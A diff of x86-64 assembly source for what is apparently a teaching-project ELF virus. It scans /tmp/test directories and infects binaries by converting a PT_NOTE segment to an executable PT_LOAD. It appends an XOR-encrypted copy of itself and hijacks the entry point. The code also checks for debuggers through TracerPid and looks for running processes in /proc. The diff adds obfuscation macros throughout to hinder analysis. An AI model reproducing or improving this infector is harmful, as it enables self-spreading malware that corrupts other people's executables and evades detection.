@@ -4,6 +4,7 @@ section .text
   global _start
 
 decryptor:
+  OBF3
   push rdx
   push rsp
 
@@ -18,6 +19,7 @@ decryptor:
   mov r12, v_stop - _start ; size of stuff we wish to decrypt
   lea rsi, [rbp + _start]
   .decrypt:
+    OBF2
     xor byte [rsi], r9b
     ror r9, 1 ; rotate key
     inc rsi
@@ -30,6 +32,7 @@ decryptor:
 
 
 _start:
+  OBF1
   push rdx
   push rsp
   ; deactivate signals?
@@ -56,12 +59,14 @@ _start:
         db '/proc/self/status', 0
 
         .open_self_status:
+          OBF2
           pop rdi ; popping '/proc/self/status' in rsi
           mov rsi, O_RDONLY;
           xor rdx, rdx ; no flags
           mov rax, SYS_OPEN
           syscall
 
+    OBF1
     cmp rax, 0 ; check error
     jl cleanup
 
@@ -76,6 +81,7 @@ _start:
 
     sub rax, 8 ; to avoid overflow
     .find_tracer_pid:
+      OBF3
       mov rdi, TRACER_PID ; put 'TracerPi' bytes in rdi
       cmp rdi, [rsi]
       je .tracer_pid_found
@@ -87,6 +93,7 @@ _start:
       jmp .find_tracer_pid
 
     .tracer_pid_found:
+      OBF1
       mov bl, byte [rsi + 11]
       mov cl, 0x30 ; compare '0'
       cmp cl, bl
@@ -98,6 +105,7 @@ _start:
         dbg_len equ $ - .dbg_msg
 
         .show_dbg_msg:
+          OBF2
           pop rsi ; popping 'DEBUG...' in rsi
           mov rax, SYS_WRITE
           mov rdi, STDOUT
@@ -112,6 +120,7 @@ _start:
         db '/proc', 0
 
       .open_proc:
+        OBF3
         pop rdi ; popping '/proc' in rsi
         mov rsi, O_RDONLY;
         xor rdx, rdx ; no flags
@@ -125,6 +134,7 @@ _start:
 
       ; Very similar to loop_getdents, but with /proc
       .loop_proc_ents:
+        OBF1
         mov rdi, [r15 + DOT_FD] ; load fd in rdi
         lea rsi, [r15 + DIRENT] ; where dirent will be stored
         mov rdx, DIRENT_SIZE
@@ -140,6 +150,7 @@ _start:
         xor rcx, rcx
 
         .loop_dir:
+          OBF2
           push rcx ; store rcx, used later at the end of while
           cmp byte [r15 + DIRENT_D_TYPE + rcx], DT_DIR ; check if it's a regular file
           jne .next_file
@@ -154,6 +165,7 @@ _start:
               pop rdi
           
           .copy_proc:
+            OBF3
             cmp byte [rdi], 0 ; finished copying dir name ?
             je .copy_dirname
 
@@ -164,6 +176,7 @@ _start:
             jmp .copy_proc
 
           .copy_dirname:
+            OBF3
             cmp byte [rsi], 0 ; finished copying dir name?
             je .init_comm
 
@@ -181,6 +194,7 @@ _start:
               pop rdi
 
           .cpy_comm:
+            OBF3
             cmp byte [rdi], 0 ; finished copying /comm ?
             je .open_comm
 
@@ -191,6 +205,7 @@ _start:
             jmp .cpy_comm
 
           .open_comm:
+            OBF2
             ; first null terminate the string
             mov byte [rax], 0
 
@@ -206,6 +221,7 @@ _start:
             mov [r15 + COMM_FD], rax
 
           .read_comm:
+            OBF1
             mov rdi, rax ; load fd
             lea rsi, [r15 + COMM] ; overwrite name
             mov rdx,  5; size
@@ -232,6 +248,7 @@ _start:
             jmp .next_file
 
           .close_comm_exit:
+            OBF2
             mov rdi, [r15 + COMM_FD] ; close file fd
             mov rax, SYS_CLOSE
             syscall
@@ -251,6 +268,7 @@ _start:
             jmp .loop_proc_ents
 
           .close_proc_folder:
+            OBF3
             mov rdi, [r15 + DOT_FD]
             mov byte [r15 + TMP_TEST], 0 ; init to 0
             mov rax, SYS_CLOSE
@@ -260,6 +278,7 @@ _start:
 
   ; --- Open "tmp" and tmp2
   start_open:
+  OBF1
   cmp byte [r15 + TMP_TEST], 0
   jne .prepare_test2
 
@@ -281,6 +300,7 @@ _start:
       jmp .open_folder
 
   .open_folder:
+  OBF2
   mov rsi, O_RDONLY ; 
   ; rdi is either "/tmp/test" or "/tmp/test2"
   xor rdx, rdx ;  no flags
@@ -294,6 +314,7 @@ _start:
 
   ; --- GetDents64
   loop_getdents:
+  OBF1
   mov rdi, [r15 + DOT_FD] ; load fd
   lea rsi, [r15 + DIRENT] ; dirent will be in r15 + DIRENT
   mov rdx, DIRENT_SIZE ; 1024, size of a dirent
@@ -310,6 +331,7 @@ _start:
 
   ; --- Loop through files in the directory
   .loop_directory:
+    OBF2
     push rcx ; store rcx, used later at the end of the while
     cmp byte[rcx + r15 + DIRENT_D_TYPE], DT_REG ; check if it's a regular file
     jne .next_file
@@ -318,6 +340,7 @@ _start:
     push r13 ; store r13
     lea rax, [r15 + COPY_BUF]
     .cpy_prefix:
+      OBF3
       cmp byte [r13], 0
       je .prepare_cpy_name
 
@@ -331,6 +354,7 @@ _start:
       pop r13 ; restore r13
       lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
       .cpy_name:
+        OBF2
         cmp byte [rdi], 0
         je .done_cpy
 
@@ -345,6 +369,7 @@ _start:
 
     ; Open file
     .open_file:
+    OBF3
     lea rdi, [r15 + COPY_BUF]
     mov rsi, O_RDWR ; Read + Write rights
     xor rdx, rdx ; no flags
@@ -384,6 +409,7 @@ _start:
     xor r14, r14 ; initialize phdr file offset
 
     .loop_phdr:
+      OBF1
       ; -- Read one header
       mov rdi, r9 ; load fd into rdi
       lea rsi, [r15 + PHDR_TYPE] ; rsi holds phdr
@@ -404,6 +430,7 @@ _start:
       jmp .loop_phdr ; loop back
 
     .infect:
+      OBF2
       ; Get phdr file offset
       mov ax, bx ; move the loop counter previously in bx to ax
       mov dx, word [r15 + EHDR_PHENTSIZE] ; mov phentsize to dx
@@ -438,15 +465,10 @@ _start:
       push rax ; store target EOF
       push r9 ; store fd on the stack
 
-      ; generate key
       ; open /dev/urandom
-      .rekt:
       xor r9, r9
       mov r9d, [r15 + OFFSET] ; load the offset we need to add
       lea rdi, [rbp + dev_urandom + r9] ; "/dev/urandom"
-      ; xor rax, rax
-      ; mov byte[rax], 0
-      ; jmp .rekt
 
       mov rsi, O_RDONLY
       mov rax, SYS_OPEN
@@ -459,6 +481,7 @@ _start:
       jmp .close_and_next_file
 
       .generate_key:
+        OBF2
         mov rdi, rax ; load fd
         lea rsi, [r15 + KEY] ; load key address
         mov rdx, 8 ; size
@@ -480,6 +503,7 @@ _start:
       lea rax, [r15 + STACK_SIZE]
       xor rdi, rdi ; init rdi
       .memcpy_decryptor:
+        OBF2
         mov dil, byte [rsi]
         mov byte[rax], dil
         inc rsi
@@ -494,6 +518,7 @@ _start:
       lea rax, [r15 + STACK_SIZE + _start - decryptor] ; only encrypt from _start
       xor rdi, rdi
       .memcpy_and_encrypt:
+        OBF1
         mov dil, byte [rsi]
         xor dil, r9b
         ror r9, 1 ; rotate key
@@ -520,6 +545,7 @@ _start:
       jmp .close_and_next_file
 
       .patch_phdr:
+      OBF3
       ; -- Patch program header
       mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
       mov dword [r15 + PHDR_FLAGS], PF_R | PF_X | PF_W ; Add rwx rights to flags
@@ -550,6 +576,7 @@ _start:
         jmp .close_and_next_file
 
       .patch_ehdr:
+      OBF2
       ; -- Patch ehdr
       mov r14, [r15 + EHDR_ENTRY] ; store original ehdr entry in r14
       mov [r15 + EHDR_ENTRY], r13 ; set entry to phdr.vaddr (VADDR)
@@ -642,6 +669,7 @@ _start:
       mov [r15 + FINGERPRINT_ADD], eax ; store it back
       mov rax, [rsi] ; load fingerprint
       .byte_from_str: ; load
+        OBF3
         xor dl, dl
         sub al, 0x30
         add dl, al
@@ -687,6 +715,7 @@ _start:
         add rdx, rax
 
       .byte_to_str: ; number is in rdx
+        OBF2
         xor rax, rax
         xor r8, r8
         mov r8, rdx ; 1
@@ -749,6 +778,7 @@ _start:
         add r8, 0x30
         add rax, r8
 
+      OBF3
       ; write fingerprint
       mov [r15 + FINGERPRINT], rax ; store fingerprint
 
@@ -791,6 +821,7 @@ _start:
       syscall
 
     .next_file:
+      OBF2
       pop rcx ; restore rcx that we previously stored
       add cx, word [rcx + r15 + DIRENT_D_RECLEN]
       cmp rcx, [r15 + DIR_SIZE]
@@ -798,6 +829,7 @@ _start:
       jmp loop_getdents
 
 check_tmp2:
+  OBF1
   cmp byte [r15 + TMP_TEST], 0
   jne close_dot
 
@@ -813,13 +845,15 @@ close_dot:
   mov rax, SYS_CLOSE
   syscall
 
+; SCOTT
 call show_msg ; pushing db 'woody' on stack
 info_msg:
   db '....WOODY....', 0xa
   info_len equ $ - info_msg
 
   show_msg:
-    pop rsi ; popping 'salut salut' in rsi
+    OBF3
+    pop rsi ; popping 'woody' in rsi
     mov rax, SYS_WRITE
     mov rdi, STDOUT
     mov rdx, info_len
